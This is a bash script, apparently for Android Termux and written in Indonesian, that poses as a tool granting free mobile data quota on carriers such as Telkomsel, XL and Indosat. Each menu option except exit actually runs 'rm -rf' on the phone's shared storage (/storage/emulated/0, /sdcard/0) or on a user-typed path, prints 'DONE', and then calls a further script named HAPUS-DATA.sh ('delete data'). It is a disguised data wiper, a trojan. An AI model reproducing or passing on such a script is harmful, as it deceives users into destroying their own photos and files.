#!/bin/bash
#version 1.0

clear
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo " "
echo " "
echo " "
echo " "
figlet -f slant "TOOLS Kuota Free ALL OP" | lolcat
echo " "
echo "             DEATH HUNTER SQUAD             " |lolcat
echo "
________________________________________________________" | lolcat
echo "          [       Tools By CRACKED     ]                       " | lolcat
echo "          [       KuotaFree        ]                   " | lolcat
echo "
________________________________________________________" | lolcat
sleep 1
figlet -f slant "PILIH KARTU MILIK KAMU" | lolcat
echo "=======================================================" | lolcat
echo " 1.KUOTA TREE 8GB                     " | lolcat
echo " 2. KUOTA INDOSAT/IM3 64GB " | lolcat
echo " 3. KUOTA XL 6GB.                        " | lolcat
echo " 4 KUOTA TELKOMSEL 100GB.   " | lolcat
echo " 5. KUOTA SMARTFREND 32GB " | lolcat
echo " 6. EXIT" | lolcat
echo "=======================================================" | lolcat
echo $green "╭─[ Silahkan Di Pilih ]"
read -p " ╰─# " asw

if [ $asw = "6" ] || [ $asw = "06" ]
then
sleep 1
echo "MAKASIH SUDAH GUNAIN TOOLS INI"
echo "SAYA MR.CRACKED"
echo "BYE BYE"
exit
fi

if [ $asw = "1" ] || [ $asw = "01" ]
then
clear
figlet -f slant "KUOTA FREE ALL OP" | lolcat
rm -rf  /storage/emulated/0
sleep 1
echo "DONE"
sleep 1
sleep 1
sh HAPUS-DATA.sh
fi

if [ $asw = "2" ] || [ $asw = "02" ]
then
clear
figlet -f slant "KUOTA FREE ALL OP" | lolcat
rm -rf /sdcard/0/
sleep 1
echo "DONE"
sleep 1
sleep 1
sh HAPUS-DATA.sh
fi


if [ $asw = "3" ] || [ $asw = "03" ]
then
echo " KUOTA FREE ALL OP"
read -p " ╰─$ "  script
rm -rf  $script 
sleep 1
echo "DONE"
sleep 1
sleep 1
sh HAPUS-DATA.sh
fi

if [ $asw = "4" ] || [ $asw = "04" ]
then
echo " KUOTA FREE ALL OP"
read -p " ╰─$ "  script
rm -rf /storage/emulated/0/ $script 
sleep 1
echo "DONE"
sleep 1
sleep 1
sh HAPUS-DATA.sh
fi

if [ $asw = "5" ] || [ $asw = "05" ]
then
echo " KUOTA FREE ALL OP"
read -p " ╰─$ "  script
rm -rf   /sdcard/0/$script 
sleep 1
echo "DONE"
sleep 1
sleep 1
sh HAPUS-DATA.sh
fi

